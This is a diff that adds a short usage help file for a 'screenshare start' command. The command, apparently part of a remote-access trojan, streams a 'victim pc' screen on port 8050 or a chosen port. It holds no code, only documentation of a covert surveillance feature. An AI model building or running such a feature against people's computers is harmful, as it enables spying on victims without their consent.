@@ -1,0 +1,12 @@
+  Usage : Starts sharing the screen of victim pc
+
+Down below are differnt variants by which you can call this command	
+
+	1) screenshare start
+		It will start screen sharing at default port 8050
+	2) screenshare start port
+		It will start screen sharing at specified port
+		Example : screenshare start 8564
+
+  Note : Sometimes screen share may not start due to port is already bind with some other app. so you just have to specify
+	 different port here while calling this command
